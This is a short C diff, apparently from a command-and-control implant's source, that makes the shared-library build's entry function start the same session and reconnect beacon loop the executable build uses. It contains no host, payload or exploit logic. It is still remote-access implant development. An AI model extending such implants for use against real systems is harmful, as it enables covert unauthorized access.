@@ -7,6 +7,7 @@
 #include <string.h>
 
 #include "sliver/config.h"
+#include "sliver/implant.h"
 #include "sliver/log.h"
 #include "sliver/platform.h"
 
@@ -25,9 +26,11 @@ static void *g_thread = 0;
 
 static void implant_body(void *arg) {
   (void)arg;
+  sliver_log_init();
   LOG_INFO("shared implant started (%s / build %s)", sliver_config_name(),
            sliver_config_build_id());
-  /* M1: hand over to the session/beacon loop here. */
+  /* Run the same session/reconnect loop the exe artifact uses. */
+  (void)sliver_implant_run(NULL);
 }
 
 SLIVER_EXPORT void IMPLANT_ENTRY_SYMBOL(void) {
